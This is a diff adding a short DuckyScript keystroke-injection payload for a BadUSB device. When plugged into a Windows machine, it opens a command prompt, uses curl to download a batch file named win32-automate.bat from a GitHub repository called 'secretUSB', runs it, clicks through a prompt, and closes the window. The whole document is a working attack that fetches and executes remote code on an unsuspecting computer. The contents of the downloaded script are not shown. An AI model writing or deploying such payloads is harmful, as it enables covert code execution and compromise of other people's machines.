@@ -1,0 +1,23 @@
+GUI r
+DELAY 200
+STRING cmd
+DELAY 200
+ENTER
+DELAY 300
+STRING curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/win32-automate.bat
+DELAY 400
+ENTER
+DELAY 400
+STRING win32-automate.bat
+DELAY 800
+ENTER
+DELAY 800
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 20000
+STRING exit
+DELAY 200
+ENTER
